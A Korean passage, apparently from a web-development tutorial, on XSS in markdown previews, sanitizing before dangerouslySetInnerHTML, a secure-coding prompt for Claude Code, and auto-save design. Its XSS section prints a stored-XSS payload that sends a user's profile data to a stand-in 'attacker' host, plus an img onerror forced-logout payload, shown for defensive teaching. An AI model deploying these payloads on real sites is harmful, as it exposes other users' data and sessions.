5.2.6 XSS 위험 — 마크다운 렌더링의 본질

왜 마크다운이 위험한가

마크다운 미리보기는 본질적으로 "사용자가 입력한 텍스트를 곧바로 HTML로 렌더하는 화면"이다. 게다가 마크다운 표준은 일부러 raw HTML 삽입을 허용한다 — <details>·<sub>·표 정렬 속성 같은 표현력을 위해.

단 한 줄로 무너지는 예시 — 저장형 XSS
# 댓글에 들어가면 그 페이지를 보는 모든 동료의 브라우저에서 실행
[클릭](javascript:fetch('/api/v1/users/me')
  .then(r=>r.json())
  .then(d=>fetch('https://attacker/'+btoa(JSON.stringify(d)))))

<img src="x" onerror="fetch('/api/v1/auth/logout',{method:'POST'})">

5.2.6 sanitize 마지막 원칙 + dangerouslySetInnerHTML
⚠️
검열 후에 마크업을 더 만들면, 더 만든 부분은 검열되지 않는다. sanitize → KaTeX 순으로 두면 KaTeX 산출물은 검열되지 않은 채 출력된다. 한 번이라도 통과하면 전체가 신뢰될 수 없다 — 새 plugin은 sanitize 이전에만.
단 하나의 규칙 — sanitize 통과 출력만 주입
// ✅ 안전: parseMarkdown 이 sanitize 까지 통과시킨 HTML
<div dangerouslySetInnerHTML={{ __html: parseMarkdown(userInput) }} />

// ❌ 위험: 사용자 입력 그대로
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ❌ 위험: 다른 라이브러리가 만든 미검증 HTML
<div dangerouslySetInnerHTML={{ __html: marked(userInput) }} />

// ❌ 위험: sanitize 후 직접 문자열 합성
<div dangerouslySetInnerHTML={{
  __html: parseMarkdown(input) + '<div>' + raw + '</div>'
}} />

코드 리뷰에서 dangerouslySetInnerHTML이 보이면 — 입력이 sanitize를 거쳤는지만 확인하면 된다.

5.2.6 Claude Code 프롬프트 패턴 + 한 줄 핵심
AI는 보안 요구를 명시하지 않으면 빠르고 위험한 코드를 낸다 — 처음부터 박아라
React 마크다운 미리보기 컴포넌트를 작성해줘. 다음 규칙을 반드시 지켜:

1. 사용자 입력은 unified + remark + rehype 파이프라인으로 처리한다.
2. 파이프라인 끝에서 두 번째에 rehype-sanitize 를 둔다 (마지막은 stringify).
3. dangerouslySetInnerHTML 은 parseMarkdown() 출력에만 사용한다.
4. KaTeX, highlight.js, GitHub 스타일 태그(details/summary/kbd/sub/sup)는
   sanitize schema 화이트리스트에 추가한다.
5. 모든 외부 링크에 rel="noopener noreferrer" 를 부착한다 (rehype 커스텀 plugin).
6. javascript:/data:/vbscript: URL 은 차단 — defaultSchema protocols 풀지 말 것.

5.3.3 자동 저장 — 사용자가 저장을 의식하지 않게
왜 사용자에게 저장을 시키지 않는가

Cmd+S를 강제하면 두 가지가 깨진다 — 첫째, 사용자가 깜빡 잊은 순간 데이터를 잃는다(신뢰 파괴, 한 번 잃으면 재방문 안 함). 둘째, 자동저장이 없으면 사용자는 몇 분마다 생각이 끊긴다. 좋은 KMS는 사용자가 저장을 의식하지 않게 한다.

핵심 동작
기능의도
디바운스 자동저장 (1.5~3초)입력 멈춘 직후 저장. 중간 모든 키를 저장하지 않음
조용한 상태 인디케이터"저장 중 / 저장됨 14:32 / 오프라인" — 작은 텍스트, 깜빡이지 않음
expectedVersion 충돌 감지다른 탭/사용자가 먼저 저장하면 409. 단순 덮어쓰기는 위험
충돌 시 머지 화면모달: "다른 곳에서 변경됨" + 옵션 셋(내 변경 유지 / 원격 받기 / 둘 다 보기)
네트워크 실패 백오프1s → 3s → 9s 지수 재시도. 그래도 실패면 localStorage에 임시 저장
beforeunload 가드저장 안 된 변경이 있으면 페이지 닫기 전 경고
Cmd+S 즉시 저장디바운스 무시 — 사용자가 명시적으로 원할 때
